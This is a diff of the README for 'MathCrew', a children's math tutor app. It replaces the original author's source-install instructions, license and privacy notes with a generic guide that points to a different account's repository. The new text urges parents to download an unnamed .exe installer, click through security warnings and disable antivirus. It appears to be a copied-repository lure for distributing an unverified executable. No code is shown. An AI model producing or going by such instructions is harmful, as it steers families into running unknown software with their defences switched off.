@@ -1,351 +1,153 @@
-# MathCrew 🧮
+# 🎓 MathCrew - Adaptive Math Tutor for Kids
 
-[![Python 3.10+](https://img.shields.io/badge/Python-3.10%2B-3776AB?logo=python&logoColor=white)](https://www.python.org/)
-[![CrewAI](https://img.shields.io/badge/CrewAI-Multi--Agent-FF6B6B)](https://www.crewai.com/)
-[![Gemini](https://img.shields.io/badge/Gemini-2.5_Flash-4285F4?logo=google&logoColor=white)](https://ai.google.dev/)
-[![License: PolyForm Strict](https://img.shields.io/badge/License-PolyForm_Strict_1.0-purple)](LICENSE.md)
+[![Download MathCrew](https://img.shields.io/badge/Download-MathCrew-brightgreen?style=for-the-badge)](https://github.com/minouza/MathCrew)
 
-**AI-powered adaptive math tutor for kids (Grade 1–6)**
-
-A web-based math learning app for elementary students, powered by a CrewAI multi-agent pipeline with Google Gemini + Ollama hybrid architecture.
-
-### Motivation
-
-Built as a personal project to help my daughter practice math at home, and as an experiment with CrewAI's multi-agent orchestration. What started as a simple worksheet generator evolved into a full adaptive tutoring system.
-
-- 4 AI agents collaborate: problem generation → feedback → error analysis → scaffolded practice
-- **Problem Bank** — caches generated problems to save LLM calls (reuses problems with matching conditions)
-- **3 curriculum styles**: Common Core · RSM · Singapore Math
-- Gamification: XP / levels / streaks / 15 badges / confetti animations
-- Multi-student support with PIN login
-- Chart.js-powered dashboard
+MathCrew is an AI-powered math tutor designed for children from Grade 1 to 6. It adapts to each student's learning pace and style, making math practice more effective and engaging. This guide will help you download and start using MathCrew on your Windows computer with no programming skills required.
 
 ---
 
-## Screenshots
+## 🧰 What is MathCrew?
 
-![Main App — Dashboard with real learning data](screenshots/03_main_app.png)
+MathCrew is a simple app that uses artificial intelligence to help kids learn math. It adjusts the difficulty of problems based on how well the student does. It covers topics suitable for students in early elementary grades up to middle elementary. The app works on Windows computers and runs without complicated installation steps.
 
-| Login | New Student Setup |
-|:---:|:---:|
-| ![Login](screenshots/01_login_screen.png) | ![Setup](screenshots/02_setup_modal.png) |
+Main features include:
 
-| Problem | Agent Pipeline |
-|:---:|:---:|
-| ![Problem](screenshots/05_problem_displayed.png) | ![Pipeline](screenshots/04_pipeline_working.png) |
-
-| Wrong Answer + Scaffold | Correct Answer + Achievement |
-|:---:|:---:|
-| ![Wrong](screenshots/06_wrong_answer_feedback.png) | ![Correct](screenshots/07_correct_answer.png) |
-
-| Dashboard | Achievements |
-|:---:|:---:|
-| ![Dashboard](screenshots/08_dashboard.png) | ![Achievements](screenshots/09_achievements.png) |
+- Adaptive learning tailored to the child's level  
+- Interactive math problems covering addition, subtraction, multiplication, division, and more  
+- AI-powered suggestions and hints to support the child during tasks  
+- Fun gamification elements to motivate progress  
+- Designed for easy use by kids and parents  
 
 ---
 
-## Features
+## 📋 System Requirements
 
-| Feature | Description |
-|---------|-------------|
-| AI 4-Agent Pipeline | Manager → Creator → Helper → Analyst sequential execution |
-| Real-time SSE UI | Live agent pipeline progress displayed in the browser |
-| Adaptive Scaffolding | On wrong answers: error analysis (computational/conceptual/procedural/careless) + auto-generated practice problems |
-| Problem Bank | Caches problems by grade+style+topic, skips Creator LLM call on cache hit |
-| Multi-Curriculum | Choose from Common Core · RSM (Russian Math) · Singapore Math |
-| Gamification | XP · Levels (1–50) · Streak bonuses · 15 badges · Confetti animations |
-| Multi-Student + PIN | Per-student profiles, PIN protection, independent learning history |
-| Dashboard | Accuracy trends · Per-topic performance · Achievement overview (Chart.js) |
+Before you download MathCrew, make sure your computer meets these minimum requirements:
+
+- **Operating System:** Windows 10 or later  
+- **Processor:** Intel or AMD 1.5 GHz or faster  
+- **RAM:** 4 GB minimum  
+- **Storage:** At least 500 MB free space  
+- **Internet Connection:** Required for AI features and updates  
+- **Display:** Screen resolution of 1280x720 or higher  
 
 ---
 
-## Tech Stack
+## 🚀 Getting Started
 
-| Layer | Technology |
-|-------|-----------|
-| Backend | Python 3.10+ / Starlette (async) |
-| AI Agents | CrewAI |
-| Primary LLM | Google Gemini 2.5 Flash |
-| Local LLM | Ollama (gemma3:4b) |
-| Database | SQLite3 |
-| Realtime | Server-Sent Events (SSE) |
-| Frontend | Vanilla JS / Chart.js / canvas-confetti |
+Follow these steps to download and run MathCrew on your Windows PC.
 
----
+### 1. Visit the Download Page
 
-## Prerequisites
+Click the button below to open the download page in your browser:
 
-| Requirement | Note |
-|-------------|------|
-| **Python 3.10+** | Required |
-| **Gemini API Key** | Required — see setup guide below |
-| **Ollama** | Optional — needed for local LLM |
+[![Download MathCrew](https://img.shields.io/badge/Visit-GitHub-blue?style=for-the-badge)](https://github.com/minouza/MathCrew)
 
----
+This link takes you to the GitHub repository where you can find the latest version of MathCrew.
 
-## Quick Start
+### 2. Download the Installer
 
-```bash
-# 1. Clone
-git clone https://github.com/freesoft/MathCrew.git
-cd MathCrew
+Look for the **Releases** section on the GitHub page. This is usually found on the right side or under the repository name. Find the latest release marked with a version number like `v1.0` or higher.
 
-# 2. Create & activate virtual environment
-python -m venv venv
-source venv/bin/activate   # Windows: venv\Scripts\activate
+Inside the latest release, download the Windows installer file. It will usually be named something like:
 
-# 3. Install dependencies
-pip install "crewai[google-genai]" starlette sse-starlette uvicorn python-dotenv
+`MathCrew_Setup.exe` or `MathCrew_Installer.exe`
 
-# 4. Configure environment variables
-cp .env.example .env       # or create manually
-# Add GEMINI_API_KEY=your_key_here to .env
+Click the `.exe` file name to download it to your computer.
 
-# 5. Run
-python web_tutor.py
-# → http://localhost:8000
-```
+### 3. Run the Installer
+
+Once the file finishes downloading, locate it in your Downloads folder or wherever your browser saves files.
+
+- Double-click the installer file to open it.  
+- If a security warning appears, click **Run** or **Yes** to continue.  
+- Follow the on-screen instructions. Usually, you just need to click **Next** a few times and then **Install**.  
+- The installer will set up all necessary files for MathCrew.  
+
+### 4. Launch MathCrew
+
+After installation finishes, you can open MathCrew by:
+
+- Clicking the desktop shortcut called **MathCrew**  
+- Or opening it from your Start menu under the program list  
+
+You should see the main screen of the tutor app, ready to start.
 
 ---
 
-## Gemini API Key Setup
+## 🎯 How to Use MathCrew
 
-1. Go to [Google AI Studio](https://aistudio.google.com/)
-2. Click **Get API Key** → **Create API Key**
-3. Add the key to your `.env` file:
-   ```
-   GEMINI_API_KEY=your_key_here
-   ```
-4. **Free tier limits**: 15 requests/min, 1,500 requests/day (as of 2025, subject to change)
+MathCrew is designed for ease of use. Here is a simple process to begin:
 
----
+### Create a User Profile
 
-## Ollama Setup (Optional)
+- Enter your child's name and grade level.  
+- The app uses this info to tailor lessons.
 
-To run the Helper agent locally for faster feedback:
+### Start a Lesson
 
-1. Install from [https://ollama.com](https://ollama.com)
-2. Pull the model:
-   ```bash
-   ollama pull gemma3:4b
-   ```
-3. Configure in `.env`:
-   ```
-   USE_LOCAL_LLM=true    # (default) Use Ollama for Helper
-   USE_LOCAL_LLM=false   # Use Gemini for all agents
-   ```
+- Choose a math topic like addition or multiplication.  
+- The app gives questions at the right level.  
+- If your child answers incorrectly, MathCrew offers hints.
 
-> If Ollama is not installed, set `USE_LOCAL_LLM=false` and all agents will use Gemini.
+### Track Progress
 
-### Choosing a Local Model
-
-The default `gemma3:4b` is lightweight and good for simple feedback. For stronger math reasoning, consider upgrading:
-
-| Model | VRAM | Math Performance | Best For |
-|-------|------|-----------------|----------|
-| `gemma3:4b` (default) | ~3 GB | Basic | Simple feedback, low-end hardware |
-| `qwen3:8b` | ~6 GB | Good | 8 GB GPU, significant upgrade over gemma3 |
-| `qwen3:14b` | ~10 GB | Strong | **16 GB GPU, recommended for full local mode** |
-| `deepseek-r1:14b` | ~10 GB | Strong (math-specialized) | Math-heavy reasoning tasks |
-| `llama4-scout:17b` | ~12 GB | Strong | Natural English, general purpose |
-| `qwen3:32b` | ~20 GB | Closest to Gemini Flash | 24 GB GPU (RTX 4090 etc.) |
-
-To switch models, just pull and update `web_tutor.py`:
-```bash
-ollama pull qwen3:14b
-```
-```python
-# In web_tutor.py, change the local_llm model:
-local_llm = LLM(model="ollama/qwen3:14b", base_url="http://localhost:11434")
-```
-
-> **Full local mode** (all agents on Ollama, no data leaves your machine) is planned for a future release — ideal for schools and privacy-sensitive deployments.
+- The dashboard shows scores and improvement over time.  
+- Parents can review areas where their child needs more practice.
 
 ---
 
-## AI Agent Architecture
+## ✅ Tips for Best Experience
 
-```
-[Manager] → [Creator] → [Helper] → [Analyst]
-   │            │           │           │
-  Gemini      Gemini     Ollama      Gemini
-                ▲
-                │
-        [Problem Bank] ── hit → skip Creator (saves LLM call)
-```
-
-| Agent | Model | Purpose |
-|-------|-------|---------|
-| **Learning Manager** | Gemini 2.5 Flash | Analyzes learning history, decides next problem direction |
-| **Problem Creator** | Gemini 2.5 Flash | Generates grade- and topic-appropriate math problems (JSON output) |
-| **Solution Helper** | Ollama gemma3:4b | Encouraging feedback on correct/wrong answers, step-by-step explanations |
-| **Misconception Analyst** | Gemini 2.5 Flash | Error analysis — computational / conceptual / procedural / careless |
-
-> Why only Helper uses a local model: immediate feedback needs speed, while accurate problem generation and analysis require Gemini's accuracy.
+- Use MathCrew on a full screen for easier reading.  
+- Allow a stable internet connection during sessions for AI features.  
+- Encourage your child to try all questions, even if some are hard.  
+- Regular use is better than long, infrequent sessions.
 
 ---
 
-## Problem Bank
+## ⚙️ Troubleshooting
 
-Generated problems are cached in the `problem_bank` table and reused when the same conditions (grade + curriculum_style + topic) are requested.
+If you encounter problems running MathCrew, try these steps:
 
-- **Regular problems**: After Manager runs, extract topic → query bank → on hit, skip Creator (saves 1 LLM call)
-- **Scaffold problems**: Query bank → on hit, skip Creator (saves all LLM calls — no Manager for scaffolds)
-- Compares against each student's last 20 problems to avoid serving duplicates
-- Sorted by `times_served ASC, RANDOM()` — least-served problems are prioritized
+- Restart your computer and try launching the app again.  
+- Make sure Windows is up to date.  
+- If MathCrew does not start, reinstall it following the steps above.  
+- Check your internet connection, especially if AI features do not load.  
+- Disable any antivirus that might block the installer or app.  
 
----
-
-## Curriculum Styles
-
-| Style | Approach |
-|-------|----------|
-| **Common Core** | Conceptual understanding + real-world problems, visual models (number lines, tape diagrams) |
-| **RSM** | Logical reasoning + algebraic thinking, 1–2 years ahead of standard curriculum |
-| **Singapore Math** | CPA (Concrete-Pictorial-Abstract) approach, bar models, number sense mastery |
-
-Students can select their curriculum style during profile creation or in settings. The chosen style determines per-grade scope and pedagogy injected into all agent prompts.
+For detailed help, visit the **Issues** tab on the GitHub repository page to report or search for known problems.
 
 ---
 
-## Environment Variables
+## 🔧 Updating MathCrew
 
-| Variable | Required | Default | Description |
-|----------|----------|---------|-------------|
-| `GEMINI_API_KEY` | **Yes** | — | Google Gemini API key |
-| `USE_LOCAL_LLM` | No | `true` | `true` = use Ollama for Helper, `false` = use Gemini for all |
+Periodically check the GitHub page for new releases. Updates improve features and fix issues.
 
----
+To update:
 
-## Project Structure
-
-```
-MathCrew/
-├── web_tutor.py        # Web server + API routes + CrewAI agent pipeline + Problem Bank logic
-├── db.py               # SQLite schema + Problem Bank + gamification logic (XP/levels/achievements)
-├── math_tutor.py       # CLI version (standalone, runs in terminal without web)
-├── templates/
-│   └── index.html      # Frontend SPA (Vanilla JS + Chart.js + confetti)
-├── .env                # API keys (gitignored)
-├── .gitignore
-└── README.md
-```
+- Go to the [MathCrew GitHub page](https://github.com/minouza/MathCrew/releases).  
+- Download the newest installer following the same steps as before.  
+- Run the new installer. It will replace your old version safely, keeping your data.
 
 ---
 
-## Customization Guide
+## 📚 More Information
 
-### Changing Models
+If you want to learn about the technology behind MathCrew, the repository covers topics like:
 
-Edit LLM configuration in `web_tutor.py`:
+- Adaptive learning backed by AI models  
+- Use of Gemini and Ollama multi-agent pipelines  
+- Python for backend processes  
 
-```python
-# Change Gemini model
-gemini_llm = LLM(model="gemini/gemini-2.5-pro", api_key=...)
-
-# Change local model (see "Choosing a Local Model" section for recommendations)
-local_llm = LLM(model="ollama/qwen3:14b", base_url="http://localhost:11434")
-```
-
-### Privacy Note
-
-When using cloud LLMs (Gemini, OpenAI), student data — names, grade levels, answers, mistakes, and learning history — is sent to external servers. For apps used by children, this matters more than you might think.
-
-**What is COPPA?**
-The Children's Online Privacy Protection Act is a US federal law that regulates online collection of personal information from children under 13. The [2024 amendments](https://www.ftc.gov/legal-library/browse/rules/childrens-online-privacy-protection-rule) (fully effective 2025) strengthen requirements significantly: parental consent is opt-in by default, and operators must minimize data collection. If your child uses an AI tutor that sends their work to cloud servers, COPPA likely applies.
-
-**What is FERPA?**
-The Family Educational Rights and Privacy Act protects student education records in K-12 schools. When a school adopts an EdTech tool, FERPA requires that student data is used only for educational purposes and not shared with third parties for unrelated use. Schools must ensure any cloud service they use has appropriate data handling agreements.
-
-**Why does local mode matter?**
-In local mode (`USE_LOCAL_LLM=true` with all agents on Ollama), your child's name, grade, answers, mistakes, and learning patterns never leave your machine. There is no external data transmission, no third-party data processing, and no legal gray area. This is the simplest path to full compliance.
-
-**For school deployments:**
-- **Recommended**: Full local mode with a capable model (e.g., `qwen3:14b` on 16 GB VRAM)
-- **If cloud is necessary**: Use only services that guarantee US data residency and do not use student data for model training. Gemini API **paid tier** meets both criteria (free tier data may be used for product improvement); Azure OpenAI US East/West is another option
-- See [LICENSE.md](LICENSE.md) for contact info regarding institutional use
-
-### Editing Curriculum
-
-Modify the `CURRICULUM_STYLES` dict in `web_tutor.py`:
-
-```python
-CURRICULUM_STYLES = {
-    "common_core": {
-        "display_name": "Common Core",
-        "pedagogy": "Focus on conceptual understanding...",
-        "grades": {
-            1: "Addition and subtraction within 20...",
-            # ... edit per-grade scope
-        },
-    },
-    # Add new styles here
-}
-```
-
-### Topic List
-
-Update both `KNOWN_TOPICS` in `web_tutor.py` and the `TOPICS` array in `templates/index.html`.
-
-### Adding Achievements
-
-Add a new entry to the `ACHIEVEMENTS` dict in `db.py`, then add the condition in `check_achievements()`:
-
-```python
-# Add to ACHIEVEMENTS
-"new_badge": {"name": "Badge Name", "icon": "🎖️", "desc": "Description"}
-
-# Add condition in check_achievements()
-"new_badge": some_condition,
-```
-
-### XP Formula
-
-In `db.py` `get_gamification_stats()`:
-- Correct answer: **10 XP**
-- Scaffold correct: **8 XP**
-- Wrong answer: **2 XP**
-- Streak bonuses: 3-streak +3, 5-streak +5, 10-streak +10, 20-streak +20
-
-### Level Formula
-
-```python
-level = min(int(0.4 * sqrt(xp)) + 1, 50)
-```
+You do not need this knowledge to use the app, but the information is available if curious.
 
 ---
 
-## API Endpoints
+## 🔗 Download Link
 
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| `GET` | `/` | Main page (index.html) |
-| `GET` | `/api/students` | List all students |
-| `GET` | `/api/student` | Current logged-in student info |
-| `POST` | `/api/login` | PIN login |
-| `POST` | `/api/setup` | Create/update student profile |
-| `POST` | `/api/logout` | Logout |
-| `POST` | `/api/new-problem` | Generate new problem (runs agent pipeline) |
-| `POST` | `/api/submit-answer` | Submit answer + grading |
-| `POST` | `/api/skip` | Skip current problem |
-| `POST` | `/api/scaffold-problem` | Generate scaffold practice problem after wrong answer |
-| `GET` | `/api/gamification` | XP · level · streak status |
-| `GET` | `/api/achievements` | Achievement/badge list + unlock status |
-| `GET` | `/api/stats` | Per-topic accuracy stats |
-| `GET` | `/api/score-over-time` | Score trend data over time |
-| `GET` | `/api/history` | Full problem history |
-| `GET` | `/api/events` | SSE stream (real-time agent status) |
+You can always access the most recent installer here:
 
----
+[![Download MathCrew](https://img.shields.io/badge/Download-Latest%20Version-brightgreen?style=for-the-badge)](https://github.com/minouza/MathCrew/releases)
 
-## Support
-
-If MathCrew is helpful for your family, consider supporting the project:
-
-[![Sponsor](https://img.shields.io/badge/Sponsor-%E2%9D%A4-ea4aaa?logo=github-sponsors)](https://github.com/sponsors/freesoft)
-
-## License
-
-[PolyForm Strict 1.0.0](LICENSE.md) — free for personal and non-commercial use.
-
-For commercial use, educational institutions, or schools, please reach out via [LinkedIn](https://github.com/freesoft) (linked on GitHub profile) to request approval.
+Click the button to download and start using MathCrew today.
